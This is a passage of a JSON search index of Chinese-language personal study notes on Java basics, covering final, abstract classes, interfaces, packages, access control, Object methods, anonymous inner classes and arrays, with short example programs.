+enter，（方法默认是private，可以修改一下）|","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/112_java%E7%9B%B8%E5%85%B3%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3":{"title":"112_java相关帮助文档","content":"# 112_java相关帮助文档\n\n\u003e[!bug]+ java帮助文档\n\u003e1. 好用的[http://www.matools.com/api/java8](http://www.matools.com/api/java8)\n\u003e2. 英文版本 https://tool.oschina.net/apidocs/api#A\n\u003e3. 看不懂的[https://www.w3cschool.cn/java/dict](https://www.w3cschool.cn/java/dict)\n\u003e4. 效果不错的 https://itmyhome.com/java-api/\n\u003e5. W3c的 https://www.w3cschool.cn/java/dict\n\n\nUML\n![[../22u异常处理/222.UML 统一建模语言]]","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/121_final":{"title":"121_final","content":"# 121_final\nfinal是一个关键字，表示最终的、不可变的。\nfinal一般用来修饰**变量，方法，类**\n## 作用\n1. final修饰的**局部变量只能赋一次值**（局部变量必须[[../../../../assets/Pasted image 20220712105836.png|手动赋值]]）\n2. final修饰的方法，**无法被覆盖、被重写**\n3. final修饰的类，**无法被继承**\n4.  **final修饰的实例变量，系统不负责赋默认值，需要你自己赋值，要么在定义的时候赋值，要么在构造方法中进行赋值**\n5. final上修饰的实例变量一般和static联合使用是，成为常量，存储在方法区，所有的实例公用一份。\n\t```java\n\tpublic static final double PI=3.1415926;\n\t```","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/122_final%E4%BF%AE%E9%A5%B0%E7%9A%84%E5%BC%95%E7%94%A8%E5%9E%8B%E5%8F%98%E9%87%8F":{"title":"122_final修饰的引用型变量","content":"# 122_final修饰的引用型变量\n实例化的对象的变量是一个**引用型变量，这个变量所指向的是这个对象在堆内存中的地址**\n通过final对其进行修饰，那么这个引用型变量将不能再指向新的对象地址，但是通过set方法区修改这个引用型变量所指向对象的内部属性\n\n```java\npublic class FinalTest01 {  \n    public static void main(String[] args) {  \n        final User u1=new User();  \n        u1.dayin();  \n        u1.setName(\" 蔡徐坤\");  \n        u1.dayin();  \n        u1.setName(\"阿三\");  \n        u1.dayin();  \n    }  \n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220712110809.png]]\n可以看到，可以对其对象的属性内容进行修改（通过set方法），这是因为u1引用型变量本身的内容是指向对象的内存地址，比如`0x235f`，而不是对象本身\n\n但是如果再次对其进行新的对象赋值，就不行了\n![[Pasted image 20220712111109.png]]\n\n![[../assets/388e98e940d040f5ba987468317183e8.png]]","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/123_final%E4%BF%AE%E9%A5%B0%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F":{"title":"123_final修饰实例变量","content":"# 123_final修饰实例变量\n```java\npublic class FinalTest03 {  \n    public static void main(String[] args) {  \n        User1 u3=new User1();  \n        System.out.println(u3.age);  \n        User1 u5=new User1(100);  \n        System.out.println(u5.age);  \n  \n    }  \n}  \nclass User1{  \n    final int age;  \n  \n    public User1() {  \n        this.age=45;  \n    }  \n  \n    public User1(int age) {  \n        this.age = age;  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220712163533.png]]\n## 结论\n1. **final修饰的实例变量，系统不负责赋默认值，需要你自己赋值，要么在定义的时候赋值，要么在构造方法中进行赋值**\n2. 只要在系统对齐赋值默认值之前，对齐进行赋值都是可以的\n3. 如果对其进行赋值了，那么就无法通过构造方法对其进行赋值（[[../../../../assets/Pasted image 20220712164409.png|没有final 属性 xxx=xxx]]）\n4. 如果没有对其进行赋值，那么就可以在构造方法的内部对其进行一次赋值\n5. final修饰的实例变量一般添加“static”进行修饰，变为静态变量，存储在方法区，节省内存空间。`static final`","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/131_%E6%8A%BD%E8%B1%A1%E7%B1%BB":{"title":"131_抽象类","content":"# 131_抽象类\n![[../../../../assets/Pasted image 20220712170300.png]]\n1. 什么是抽象类？\n\t1. 类和类之前具有共同特征，把共同特征提取出来，形成的就是抽象类。抽象类本身不存在，所以抽象类无法创建对象，无法实例化。\n2. 抽象类的数据类型\n\t1. 引用数据类型\n3. 抽象类是用来继承的，所以final和abstract不能结合使用\n4. 抽象类的子类可以是抽象类\n5. 抽象类无法实例化，但是可以有构造方法，这个构造方法是供子类使用的\n\n## 定义的语法\n```java\n[修饰符列表] abstract class 类名{\n\t类体;\n}\n```\n\n","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/132_%E6%8A%BD%E8%B1%A1%E6%96%B9%E6%B3%95":{"title":"132_抽象方法","content":"# 132_抽象方法\n1. 抽象方法表示没有实现的方法，没有方法体的方法\n\t```java\n\tpublic abstract void doSome();\n\t```\n2. 抽象类不一定有抽象方法，但是**抽象方法只能出现在抽象类中。**\n3. **一个非抽象的类继承抽象类，必须将抽象类中的抽象方法覆盖，进行实现**。（因为抽象方法只能卸载抽象类中，所以才需要这样）","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/133_%E4%BE%8B%E5%AD%90":{"title":"133_例子","content":"# 133_例子\n```java\npublic class AbstractTest01 {  \n    public static void main(String[] args) {  \n        Animal c1=new Cat();//向上转型  \n        c1.move();  \n    }  \n  \n}  \nabstract class Animal{  \n    public abstract  void move();  \n}  \n  \n  \nclass Cat extends Animal{  \n      \n    public void move(){  \n        System.out.println(\"小猫走猫步\");  \n    }  \n}\n```\n![](../../../../assets/Pasted%20image%2020220812215034.png)","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/134_%E9%9D%A2%E8%AF%95%E9%A2%98":{"title":"134_面试题","content":"# 134_面试题\n\u003e[!java语言中凡是没有方法体的方法都是抽象方法吗？]\n\u003e错误。\n\u003eObject类中的很多方法都没有方法体，都是以“；”结尾。但是他们都不是抽象方法。\n\u003e比如`public native int hashCode();`\n\u003e这个方法底层调用了C++写的动态链接库程序，前面修饰符列表中没有abstract，有一个native，表示调用JVM本地程序","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/141_%E6%8E%A5%E5%8F%A3":{"title":"141_接口","content":"# 141_接口\n## 语法格式\n```java\n[修饰符列表] interface 接口名{\n\n}\n```\n## 基础语法\n1. 接口等于**常量+抽象方法**\n4. 接口也是一种“引用数据类型”，编译之后，也是一个class字节码文件\n5. 接口是完全抽象的（抽象类是半抽象的），也可以说接口是特殊的抽象类\n6. 接口支持继承，且**支持多继承**\n7. 接口中只包含两部分内容：1. 常量；2.**抽象**方法\n8. 接口中的所有元素都是**public**修饰的 \n9. `public abstract`可以省略不写\n10. 接口中都是抽象方法，所以不能有方法体\n11. 接口中的常量 `public static final`也可以省略不写\n\n## 接口的使用\n1. 类和接口之间叫做**实现**，可以看做继承\n\t1. 继承用extens关键字完成\n\t2. 实现用`implement`关键字完成\n2. **接口中不能有方法体**\n3. **接口可以继承多个接口**\n4. 当一个非抽象的类实现接口的话，**必须对接口中的抽象方法进行 方法覆盖**，同时进行方法覆盖的要求和继承中方法覆盖的要求一样，访问权限只能更高 ，不能更低，一般是public\n5. 接口可以继承接口，类可以实现接口，抽象类不可以继承接口\n6. **一个类可以实现多个接口**（弥补了java中类和类只支持单继承的缺陷，类似于多继承）\n7. 接口与接口之间没有继承关系，也可以**强制类型转换**，编译没错，但是陨星的时候可能 会出现`ClassCastException`异常，建议**接口转型之前进行instanceof进行判断**\n8. extends和implements可以共存，extends在前，implements在后 [[044.extends和implements同时出现|例子]]\n9. 使用接口可以采用多态，父类型引用接口指向子类型对象`Flyable cat=new Cat();`\n\n## 接口中在开发的作用\n类似多态在开发中的作用\n面向抽象编程，不要具体编程。低耦合高扩展\n1. 接口是完全抽象的，面向接口编程\n2. ","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/142_%E6%8E%A5%E5%8F%A3eg1":{"title":"142_接口eg1","content":"# 142_接口eg1\n```java\npublic class Test {  \n  \n  \n    public static void main(String[] args) {  \n        //调用接口中的常量,  \n        System.out.println(MyMath.PI);  \n    }  \n}  \n  \ninterface MyMath {  \n    //    常量,省略 public static final，接口中随便写一个变量就是常量  \n    double PI = 3.1415926;  \n  \n    //    抽象方法,可以省略public abstract  \n    int sum(int a, int b);  \n}\n```\noutput\n```\n3.1415926\n```","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/143_%E4%B8%80%E4%B8%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%B8%AA%E6%8E%A5%E5%8F%A3":{"title":"143_一个类实现多个接口","content":"# 143_一个类实现多个接口\n```java\npublic class Test01 {  \n    public static void main(String[] args) {  \n        D d1=new D();  \n        d1.f1();  \n        d1.f2();  \n        d1.f3();  \n    }  \n}  \ninterface A{  \n    void f1();  \n}  \ninterface B{  \n    void f2();  \n}  \ninterface C{  \n    void f3();  \n}  \n  \nclass D implements A,B,C{  \n    public void f1(){  \n        System.out.println(\"我是F1\");  \n    }  \n    public void f2(){  \n        System.out.println(\"我是f2\");  \n    }  \n    public void f3(){  \n        System.out.println(\"我是f3\");  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220712215205.png]]","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/144_extends%E5%92%8Cimplements%E5%90%8C%E6%97%B6%E5%87%BA%E7%8E%B0":{"title":"144_extends和implements同时出现","content":"# 144_extends和implements同时出现\n```java\npublic class Test02 {  \n    public static void main(String[] args) {  \n        Flyable c1=new Cat();//创建对象，父类型指向子对象。多态  \n        c1.fly();  \n//        同一个接口调用同一个方法  \n        Flyable s1=new Snake();//创建蛇  \n        s1.fly();  \n    }  \n}  \n//动物类：父类  \nclass Animal{  \n  \n  \n}  \n//飞的技能接口  \ninterface Flyable{  \n//    飞的方法  \n    void fly();  \n}  \n//猫类：动物子类  \nclass Cat extends Animal implements Flyable{  \n//        实现接口中的飞的方法  \n    public void fly(){  \n        System.out.println(\"我是一只猫，我想做太空猫，我要飞！\");  \n    }  \n}  \n  \nclass Snake extends Animal implements Flyable{  \n    public void fly(){  \n        System.out.println(\"我是一条蛇，我飞不起来\");  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220712221053.png]]","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/145_%E6%8E%A5%E5%8F%A3%E5%9C%A8%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8":{"title":"145_接口在开发中的作用","content":"# 145_接口在开发中的作用\n## 作用\n将调用者和实现者解耦合。\n调用者面向接口调用，实现者面向接口编写实现。","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/146_is_ahas_alike_a":{"title":"146_is_a、has_a、like_a","content":"# 146_is_a、has_a、like_a\n1. 凡是满足“**has a**”来描述的，表示“关联关系”，统一以**属性**的方式存在。\n\t```java\n\tclass A{\n\t\tB b\n\t}\n\t```\n```java\nclass Custer{\n\t//每个顾客手里都有一个菜单，菜单就是另一个接口类，包含了很多的做菜方法\n\tFootMenu footMenu;//顾客有一个菜单，所以设置为属性 \n}\n```\n2. 凡是满足“**is a**”来描述的，表示可以设置为**继承**。\n\t```java\n\tclass A extend B\n\t```\n\t```java  //猫是一只动物，我以采用继承\n\tclass Cat extends Animal{\n\t}\n\t```\n1. 翻译满足“l**ike a**”，表示**实现关系**，通常是**类实现接口**。\n\t```java\n\tclass A implements B{\n\t}\n\t```\n\n```java\n\tclass ChineseCooker implements FoodMenu{\n\t\t//厨师像一个菜单一样，实现了菜单中的具体方法，所以可以通过类实现接口中的方法\n\tpublic void cook(){}\n\t}\n```","lastmodified":"2023-05-31T09:03:32.961907053Z","tags":null},"/147_%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8C%BA%E5%88%AB":{"title":"147_抽象类和接口的区别","content":"# 147_抽象类和接口的区别\n1. 抽象：抽象类是半抽象的；接口是完全抽象的\n2. 构造方法：抽象类中有构造方法；接口中没有构造方法\n3. 继承：类与类之间只能单继承；接口与接口之间支持多继承。\n4. 实现与继承：一个类可以同时实现（`implements`）多个接口；一个抽象类只能继承（`extends`）一个类（单继承）\n5. 定义：接口中只允许常量和抽象方法\n6. 使用频率：一般接口比抽象类多，抽象类使用的少。接口一般是对行为的抽象，接口就是为了扩展能力。\n\n","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/148_%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0eg2%E5%8E%A8%E5%B8%88%E7%82%92%E8%8F%9C":{"title":"148_接口实现eg2厨师炒菜","content":"# 148_接口实现eg2厨师炒菜\n1. 书写接口方法，用来描写具体的做菜方法\n```java\n//菜单  \n//用来描述具体的菜单做的东西  \npublic interface FootMenu {  \n    void Yuxiangrousi();  \n    void Fanqiechaodan();  \n}\n```\n2. 用类去实现接口中的具体方法\n```java\n//定义厨师类去具体实现菜单接口中的方法  \npublic class ChineseCooker implements FootMenu{  \n    public void Yuxiangrousi(){  \n        System.out.println(\"中餐厨师 做的鱼香肉丝\");  \n    }  \n    public void Fanqiechaodan(){  \n        System.out.println(\"中餐厨师 做的番茄炒蛋\");  \n    }  \n}\n```\n\n```java\n//美国厨师  \npublic class AmericanCooker implements FootMenu{  \n    public void Yuxiangrousi(){  \n        System.out.println(\"西餐厨师 做的鱼香肉丝\");  \n    }  \n    public void Fanqiechaodan(){  \n        System.out.println(\"西餐厨师 做的番茄炒蛋\");  \n    }  \n}\n```\n3. 描写客户，客户有个一个菜单（has a），所以需要将其定义为属性，并进行封装\n```java\n//客户类  \npublic class Customer {  \n    FootMenu footmenu;//客户手里的菜单通过菜单点菜  \n  \n    //点餐方法  \n    public  void order(){  \n        footmenu.Fanqiechaodan();  \n        footmenu.Yuxiangrousi();  \n    }  \n//    进行封装  \n  \n    public Customer(){}  \n    public Customer(FootMenu footmenu) {  \n        this.footmenu = footmenu;  \n    }  \n  \n    public FootMenu getFootmenu() {  \n        return footmenu;  \n    }  \n  \n    public void setFootmenu(FootMenu footmenu) {  \n        this.footmenu = footmenu;  \n    }  \n}\n```\n4. 整个主方法，点餐的过程\n\t1. 首先创建对象**中餐厨师**，以及菜单\n\t2. 创建客户，客户中有一个菜单，所以通过构造方法进行赋值\n\t3. 调用点餐方法\n```java\npublic class ATest {  \n    public static void main(String[] args) {  \n//        创建中餐厨师厨师  \n        FootMenu f1=new ChineseCooker();// 因为厨师是菜单的实现，所以通过父类接口去实现子类对象  \n//        创建客户  \n        Customer c1=new Customer(f1);//客户有一个菜单属性，通过这个菜单进行点餐  \n//        点餐  \n        c1.order();//order是客户类的方法，order方法中具体书写了具体的点餐方法  \n  \n        FootMenu f2=new AmericanCooker();  \n        Customer c2=new Customer(f2);  \n        c2.order();  \n  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220713105429.png]]\n\n## 还需要优化的问题：\n整个程序实现了点餐的过程，但是没有客户自己选择的权利，意思就是order中的点餐需要进行优化\n客户要点番茄炒蛋就只番茄炒蛋，要哪几个就只要那几个，而这个中只能全部点餐\n\n\u003e[!改进办法]\n\u003e在order方法中添加一个用于判断点餐的if语句\n\neg\n```java\nif (caiming==\"鱼香肉丝\") {  \n    foodMenu.yxrs();  \n}        if (caiming==\"番茄炒蛋\") {  \n    foodMenu.fqcd();  \n}        if (caiming==\"蚂蚁上树\") {  \n    foodMenu.myss();  \n}\n```","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/151_package":{"title":"151_package","content":"# 151_package\n1. 作用\n\t1. package是java中的包机制，包机制的作用是为了方便程序的管理。不同功能的类分别存放在不同的包下。\n2. package的使用\n\t1. package是一个IE关键字，后面加包名\n\t\t1. 只允许出现在java源代码第一行\n\t\t2. `package com.bkd.jase.chapter17`\n3. 包名的命名规范\n\t1. 公司域名倒序+项目名+模块名+功能名\t\n\n## 对于package的程序，Java程序的运行过程\n编译\n\t和以前一样 \t`javac -d 文件名 `\n运行\n\t在项目的根文件夹，采用 `包名.类名`来运行\n\t![[../../../../assets/Pasted image 20220713151848.png]] ","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/152_import%E6%9C%BA%E5%88%B6%E7%9A%84%E4%BD%BF%E7%94%A8":{"title":"152_import机制的使用","content":"# 152_import机制的使用\n当两个类不在一个包内，当  需要调用另一个包的文件时，就需要使用import导入别的包\n特殊：`java.lang`这个包下的类不需要使用，因为他默认是`自动导入`的\n\neg\n![[../../../../assets/Pasted image 20220713153048.png]]\n\n运行output\n![[../../../../assets/Pasted image 20220713153625.png]]\n\n如果不导包，可以采用\n```java\n包名.类名 名称=new 包名.类名\n```\n来使用别的包的类\n\n按需导入，可以采用“``\\*``”去进行通配，不影响运行时的效率，只是影响编译时的效率，因为在编译时是去找需要导入的包，而不是把里面的所有包全面导进去。","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/161_%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90":{"title":"161_访问控制权限","content":"# 161_访问控制权限\n## 四种权限\n1. `private` 私有的\n\t\n\t1. 只能在**本类**中使用，可以通过封装的方式让外部进行访问\n\t\n2. `public` 公开的\n\t\n\t1. **任何位置**都可以访问\n\t\n3. 默认，什么都不写\n\n   1. 只能在**本类或同包**下访问\n\n4. `protected` 受保护的\n\n  1. 只能在**本类或同包以及子类**下访问\n\n  \n\n| 访问控制权限修饰符 |         访问         |\n| :----------------: | :------------------: |\n|      private       |       **本类**       |\n|       public       |     **任何位置**     |\n|        默认        |    **本类、同包**    |\n|     protected      | **本类、同包、子类** |\n\n\n\n## 可以修饰什么\n\n1. 属性\n2. 方法","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/171_Object%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95":{"title":"171_Object类中的常用方法","content":"# 171_Object类中的常用方法\nJDK库的根类：`Object`\n\n怎么去查找：\n1. 源代码中找\n2. 查阅java\t帮助文档，可以通过javadoc来生成\n\t1. ![[../../../../assets/Pasted image 20220713193605.png]]\n\n\n---\n额外知识：\n\u003e[!API]\n\u003e应用程序编程接口。（Application Program Interface)\n\u003e整个JDK的类库就是一个javase的API.\n\u003e每一个API都会配置一套API帮助文档。\n\n  ## 常用方法：\n  ### toString()\n默认实现是：\n`类名@对象的内存地址转换为十六进制的形式`\n将一个java对象转换成字符串表示形式，建议所有子类都去重写toString()方法\n**打印默认会调用此方法，比如println和print**\n [[../../爪哇基础/07方法覆盖和多态/01方法覆盖/074.例子toString方法覆盖#^tostringfffg|例子]]\n \n ### equals\n 默认实现：\n \n 目的：\n 通过equals来判断两个**对象是否相等**\n 用来判断两个基本数据 类型是否相等用“==”，而对象用“equals\"来判断\n \n 对象使用“==”判断的是在**对象保存的内存地址**  \n \n\u003e 重写equals之前，是比较的内存地址，所以常常也需要重写**equals**方法。\n\nString已经重写了equals方法，所以两个字符串的比较，可以不用再重写equals方法了，直接用equals方法来比较两个字符串的内容是否相同。\n\n## finalize()\n![[../../../../assets/Pasted image 20220713215900.png]]\n\n1. 不需要程序员手动调用，JVM的垃圾回收器去负责调用这个方法\n2. finalize()方法实际 是sun公司为java程序员准备的一个时机，**垃圾销毁时机**\n3.  **只需要重写，不需要调用，将来自动会有程序来调用**（GC负责来调用finalize()方法）\n4.  建议垃圾回收器启动（也可能 不启动，只是可能 性加大了）`System.gc();\t`\n\n# hashCode()\n```java\npublic native int hashCode();\n```\n不是抽象方法，带有native，底层调用c++程序\n实际上是**一个java对象的内存地址，经过哈希算法，得出的一个数值**\n可以看作一个java的内存地址 \n\t![[../../../../assets/Pasted image 20220715090249.png]]","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/172_%E9%87%8D%E5%86%99equals%E6%96%B9%E6%B3%95eg":{"title":"172_重写equals方法eg","content":"# 172_重写equals方法eg\n```java\nimport com.sun.org.apache.regexp.internal.REUtil;  \n  \npublic class Test01 {  \n  \n    public static void main(String[] args) {  \n        Student s1=new Student(12,\"张三\");  \n        Student s2=new Student(12,\"张三\");  \n        Student s3=new Student(14,\"张三\");  \n        System.out.println(s1.equals(s2));  \n        System.out.println(s1.equals(s3));  \n    }  \n}  \n//Student  \nclass Student {  \n    private int no;  \n    private String name;  \n  \n    //重写equals方法来判断两个学生是否是一个学生  \n    //通过比较两个学生的姓名和学号来判断  \n    //重写toString 方法  \n    public String toString() {  \n        return no + name + \"\";  \n    }  \n  \n    //方法覆盖  \n    public boolean equals(Object obj) {  \n        if (obj == null || !(obj instanceof Student)) {  \n            return false;  \n        }  \n        if (this == obj) return true;  \n        Student s=(Student) obj;  \n        return (this.name.equals(s.name) \u0026\u0026 this.no==s.no);  //因为姓名是string类型的，所以还是需要用equals来对字符进行比较，这个equals是调用的string的equals，不是Student类型对象的equals\n    }  \n  \n  \n  \n    //constructor  \n    public Student() {  \n    }  \n  \n    public Student(int no, String name) {  \n        this.no = no;  \n        this.name = name;  \n    }  \n  \n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220713211529.png]]  ","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/181_%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB":{"title":"181_匿名内部类","content":"# 181_匿名内部类\n---\ntag: 装逼\n---\n1. \n\u003e[!TIP]- 内部类：\n\u003e在一个类的内部又定义了一个新的类\n\n2. \n\u003e[!tip]- 内部类的分类   [[182.匿名内部类eg#^19f5ae|三种内部类的eg]]\n\u003e静态内部类：类似于静态变量\n\u003e实例内部类：类似于实例变量\n\u003e局部内部类：类似于局部变量，匿名内部类属于这一类\n\n# 注意\n![[182.匿名内部类eg#^8442de]]\n![[182.匿名内部类eg#^85d701]]\n\n","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/182_%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BBeg":{"title":"182_匿名内部类eg","content":"# 182_匿名内部类eg\n```java\n/*\n\t匿名内部类：\n\n\t\t1、什么是内部类？\n\t\t\t内部类：在类的内部又定义了一个新的类。被称为内部类。\n\n\t\t2、内部类的分类：\n\t\t\t静态内部类：类似于静态变量\n\t\t\t实例内部类：类似于实例变量\n\t\t\t局部内部类：类似于局部变量\n\n\t\t3、使用内部类编写的代码，可读性很差。能不用尽量不用。\n\n\t\t4、匿名内部类是局部内部类的一种。\n\t\t\t因为这个类没有名字而得名，叫做匿名内部类。\n\t\t\n\t\t5、学习匿名内部类主要是让大家以后在阅读别人代码的时候，能够理解。\n\t\t并不代表以后都要这样写。因为匿名内部类有两个缺点：\n\t\t\t缺点1：太复杂，太乱，可读性差。\n\t\t\t缺点2：类没有名字，以后想重复使用，不能用。\n\t\t\n\t\t6、不理解算了，你只要记住这种写法就行。\n*/\n\nclass Test01{\n\n\t// 静态变量\n\tstatic String country;\n\t// 该类在类的内部，所以称为内部类\n\t// 由于前面有static，所以称为“静态内部类”\n\tstatic class Inner1{\n\t}\n\t\n\t// 实例变量\n\tint age;\n\t// 该类在类的内部，所以称为内部类\n\t// 没有static叫做实例内部类。\n\tclass Inner2{\n\t}\n\n\t// 方法\n\tpublic void doSome(){\n\t\t// 局部变量\n\t\tint i = 100;\n\t\t// 该类在类的内部，所以称为内部类\n\t\t// 局部内部类。\n\t\tclass Inner3{\n\t\t}\n \n\n\tpublic void doOther(){\n\t\t// doSome()方法中的局部内部类Inner3，在doOther()中不能用。\n\t}\n\n\t// main方法，入口\n\tpublic static void main(String[] args){\n\t\t// 调用MyMath中的mySum方法。\n\t\tMyMath mm = new MyMath();\n\t\t/*\n\t\tCompute c = new ComputeImpl();\n\t\tmm.mySum(c, 100, 200);\n\t\t*/\n\t\t\n\t\t//合并（这样写代码，表示这个类名是有的。类名是：ComputeImpl）\n\t\t//mm.mySum(new ComputeImpl(), 100, 200);\n\t\n\t\t// 使用匿名内部类，表示这个ComputeImpl这个类没名字了。\n\t\t// 这里表面看上去好像是接口可以直接new了，实际上并不是接口可以new了。\n\t\t// 后面的{} 代表了对接口的实现。\n\t\t// 不建议使用匿名内部类，为什么？\n\t\t// 因为一个类没有名字，没有办法重复使用。另外代码太乱，可读性太差。\n\t\tmm.mySum(new Compute(){\n\t\t\tpublic int sum(int a, int b){\n\t\t\t\treturn a + b;\n\t\t\t}\n\t\t}, 200, 300);\n\n\n\n\t}\n\n}\n\n// 负责计算的接口\ninterface Compute{ \n\t\n\t// 抽象方法\n\tint sum(int a, int b);\n}\n\n// 你自动会在这里编写一个Compute接口的实现类\n/*\nclass ComputeImpl implements Compute{\n\n\t// 对方法的实现\n\tpublic int sum(int a, int b){\n\t\treturn a + b;\n\t}\n}\n*/\n\n// 数学类\nclass MyMath{\n\t// 数学求和方法\n\tpublic void mySum(Compute c, int x, int y){\n\t\tint retValue = c.sum(x, y);\n\t\tSystem.out.println(x + \"+\" + y + \"=\" + retValue);\n\t}\t\n}\n\n```\n\n^19f5ae\n\n---\n\n自己写的\n```java\npublic class Test01 {  \n    public static void main(String[] args) {  \n        Math m1=new Math();  \n        Calc c1=new CalcIm();  \n        System.out.println(\"非匿名内部方式\");  \n        m1.mysum(c1,5,10);  \n        System.out.println(\"匿名内部的方式\");  \n        m1.mysum(new Calc() {  \n            @Override  \n            public int sum(int a, int b) {  \n                return a+b;  \n            }  \n        }, 15, 20);  \n    }  \n}  \n  \n//计算接口  \ninterface Calc{  \n    int sum(int a,int b);//加法  \n}  \n//对calc进行实现  \nclass CalcIm implements Calc{  \n  \n    @Override  \n    public int sum(int a, int b) {  \n       return a+b;  \n    }  \n}  \n  \n//math类  \nclass Math{  \n//    math的加法方法，调用了calc接口实现的CalcIm方法  \n    public void mysum(Calc c,int x,int y){ //接口calc需要类去实现，然后再产生实例  \n        c.sum(x,y);  \n        System.out.println(x+\"+\"+y+\"=\"+c.sum(x,y));  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220715162727.png]]\n\n\u003e[!FAQ]+ 常见问题 \n\u003e缺点\n\u003e\t缺点1：太复杂，太乱，可读性差。\n\u003e\t缺点2：类没有名字，不能重复使用\n\u003e使用的注意点\n\u003e\t1. 不需要class去实现那个接口，可以直接new 接口，然后在花括号里面实现方法覆盖\n\u003e\t2. 注意参数是，new的是接口，不是像别的那样采用`类型 名称`的方式作为实参\n\u003e\t3. 接口不能作为参数实现，但是new的接口可以通过匿名内部类的方式作为类的匿名类作为参数带入\n\n^8442de\n\n```java\nm1.mysum(new Calc() {  \n\t@Override  \n\tpublic int sum(int a, int b) {  \n\t\treturn a+b;  \n\t}  \n}, 15, 20);  \n```\n\n^85d701\n\n","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/191_%E6%95%B0%E7%BB%84":{"title":"191_数组","content":"# 191_数组\n## 概述\n1. Java语言中的数组是一种**引用数据类型**。不属于基本数据类型。数组的父类是`Object`。\n2. 数组可以同时容纳多个元素。（数组是一个数据的集合。）\n3. 数组当中*可以存储“基本数据类型”的数据，也可以存储“引用数据类型”的数据。*\n4. 数组因为是引用类型，数组是**存储在堆中**的\n5. 数组当中如果存储的是“java对象”的话，实际上存储的是对象的**引用（内存地址）**，数组中不能直接存储java对象。\n6. 数组一旦创建，**数组长度不可变**\n7. 数组的分类：一维数组. 二维数组. 三维数组. 多维数组...（一维数组较多，二维数组偶尔使用！）\n8. 采用`length`用来获取数组中元素的个数。\n9. java中的数组要求**数组中元素的类型统一**。比如int类型数组只能存储int类型，Person类型数组只能存储Person类型。\n例如：超市购物，购物袋中只能装苹果，不能同时装苹果和橘子。（数组中存储的元素类型统一）\n10. 数组在内存方面存储的时候，**存储的每一个元素都是连续的**，内存地址连续。数组实际上是一种简单的数据结构。\n11.数组中**首元素的内存地址作为整个数组对象的内存地址**。\n12. 数组中每一个元素都是有下标的，下标从0开始，以1递增。**最后一个元素的下标是`length - 1`**\n13. 存取元素都是通过下标来进行的。\n\n\u003e[!TIP]+ 缺点\n\u003e1. 数组上随机删除或者增加元素的时候，效率较低，因为随机增删元素会涉及到后面元素统一向前或者向后位移的操作 \t\n\u003e2. 不能存储大数据量，因为很难在内存空间上找到一块特别大的连续的内存空间\n\n注意：对于数组中最后一个元素的增删，是没有效率影响的。\n\n---\n## 内存图\n![[../assets/3062e3ea09e54594a375aa40b226da64.png]]\n---\n\n## 定义和声明\n\n### 语法格式\n```java\nint[] array1;//整型\ndouble[] array2;//doule\nboolean[] array3;//布尔\nString[] array4;//字符\nObject[] array5;//对象型，引用型\n```\n\n### 初始化\n\u003e[!info]+ 用处\n\u003e静态初始化主要用在**知道具体的元素**的情况，动态初始化在不知道具体元素，或者只用一次的时候\n1. 动态初始化\n```java\nint[] array1=new int[5];//初始化一个一个元素的数组，整型\nString[] name=new String[4];\n```\n2. 静态初始化\n```java\nint[] array={1,5,2,3};\n```\n\neg\n\t\n```java\n\t\tSystem.out.println(new int[]{1,5,4});\n```\n```\n```\n## 创建和遍历\n```java\npublic class ArrayTest01 {\n    public static void main(String[] args) {\n        // 声明一个int类型的数组，使用静态初始化的方式\n        int[] a = {1, 100, 10, 20, 55, 689};\n        // 这是C++风格，不建议java中使用。\n        //int a[] = {1, 100, 10, 20, 55, 689};\n\n        // 所有的数组对象都有length属性\n        System.out.println(\"数组中元素的个数\" + a.length);\n\n        // 数组中每一个元素都有下标\n        // 通过下标对数组中的元素进行存和取。\n        // 取（读）\n        System.out.println(\"第一个元素 = \" + a[0]);\n        System.out.println(\"最后一个元素 = \" + a[5]);\n        System.out.println(\"最后一个元素 = \" + a[a.length - 1]);\n\n        // 存（改）\n        // 把第一个元素修改为111\n        a[0] = 111;\n        // 把最后一个元素修改为0\n        a[a.length - 1] = 0;\n\n        System.out.println(\"第一个元素 